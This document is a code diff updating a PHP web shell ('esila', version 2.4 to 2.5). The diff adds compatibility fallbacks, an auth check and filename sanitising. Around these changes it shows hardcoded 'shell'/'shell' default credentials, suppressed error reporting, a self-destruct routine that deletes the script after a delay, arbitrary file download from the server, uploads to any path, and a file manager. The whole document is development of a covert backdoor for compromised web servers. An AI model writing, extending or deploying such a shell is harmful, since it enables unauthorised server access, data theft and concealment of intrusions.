@@ -6,6 +6,7 @@ error_reporting(0);
 if (!function_exists('str_contains')) { function str_contains($h,$n){return $n===''||strpos($h,$n)!==false;} }
 if (!function_exists('str_starts_with')) { function str_starts_with($h,$n){return $n===''||strncmp($h,$n,strlen($n))===0;} }
 if (!function_exists('array_key_first')) { function array_key_first($a){foreach($a as $k=>$v)return $k;return null;} }
+if (!function_exists('random_int')) { function random_int($min,$max){return mt_rand($min,$max);} }
 
 // Session hardening - Windows IIS often has broken session save path
 if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
@@ -21,7 +22,7 @@ if(!isset($_SESSION)){$_SESSION=array();}
 define('IS_WIN', strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
 define('DEFAULT_USER', 'shell');
 define('DEFAULT_PASS', 'shell');
-define('VERSION', '2.4');
+define('VERSION', '2.5');
 
 // PowerShell-safe single-quote escaping for .ps1 scripts
 function ps_quote($s) { return "'" . str_replace("'", "''", $s) . "'"; }
@@ -77,19 +78,23 @@ if (isset($_POST['action']) && $_POST['action'] === 'self_destruct') {
         } else {
             esila_exec("nohup bash -c 'sleep $delay && rm -f " . escapeshellarg($self) . "' >/dev/null 2>&1 &");
         }
-        echo json_encode(['ok' => true, 'msg' => "Self destruct in $minutes minutes"]);
+        echo json_encode(array('ok' => true, 'msg' => "Self destruct in $minutes minutes"));
     } else {
-        echo json_encode(['ok' => false, 'msg' => 'Invalid minutes (1-1440)']);
+        echo json_encode(array('ok' => false, 'msg' => 'Invalid minutes (1-1440)'));
     }
     exit;
 }
 
-// Download handler
+// Download handler (requires auth)
 if (isset($_GET['download'])) {
+    if (!isset($_SESSION['logged_in']) && !(isset($_COOKIE['esila_auth']) && $_COOKIE['esila_auth'] === md5(DEFAULT_USER . ':' . DEFAULT_PASS))) {
+        http_response_code(403); exit;
+    }
     $f = $_GET['download'];
     if (is_file($f) && is_readable($f)) {
+        $bn = basename($f);
         header('Content-Type: application/octet-stream');
-        header('Content-Disposition: attachment; filename="' . basename($f) . '"');
+        header('Content-Disposition: attachment; filename="' . str_replace('"', '_', $bn) . '"');
         header('Content-Length: ' . filesize($f));
         readfile($f);
     }
@@ -194,7 +199,7 @@ function fixHtaccess(mode) {
 
 // Authenticated API endpoints
 if (!isset($_SESSION['cwd'])) $_SESSION['cwd'] = getcwd() ?: (IS_WIN ? 'C:\\' : '/');
-if (!isset($_SESSION['history'])) $_SESSION['history'] = [];
+if (!isset($_SESSION['history'])) $_SESSION['history'] = array();
 $cwd = $_SESSION['cwd'];
 
 // Logout
@@ -352,8 +357,10 @@ if (isset($_POST['cmd'])) {
 // Upload
 if (isset($_FILES['upload'])) {
     header('Content-Type: application/json');
-    $dest = (isset($_POST['upload_path']) ? $_POST['upload_path'] : $cwd) . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
-    echo json_encode(['ok' => move_uploaded_file($_FILES['upload']['tmp_name'], $dest), 'name' => basename($dest)]);
+    $up_dir = isset($_POST['upload_path']) ? $_POST['upload_path'] : $cwd;
+    if (!is_dir($up_dir)) $up_dir = $cwd;
+    $dest = $up_dir . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
+    echo json_encode(array('ok' => move_uploaded_file($_FILES['upload']['tmp_name'], $dest), 'name' => basename($dest)));
     exit;
 }
 
@@ -361,8 +368,8 @@ if (isset($_FILES['upload'])) {
 if (isset($_POST['action']) && $_POST['action'] === 'filemanager') {
     header('Content-Type: application/json');
     $path = isset($_POST['path']) ? $_POST['path'] : $cwd;
-    if (!is_dir($path)) { echo json_encode(['error' => 'Not a directory']); exit; }
-    $items = [];
+    if (!is_dir($path)) { echo json_encode(array('error' => 'Not a directory')); exit; }
+    $items = array();
     foreach (@scandir($path) as $f) {
         if ($f === '.') continue;
         $fp = $path . DIRECTORY_SEPARATOR . $f;
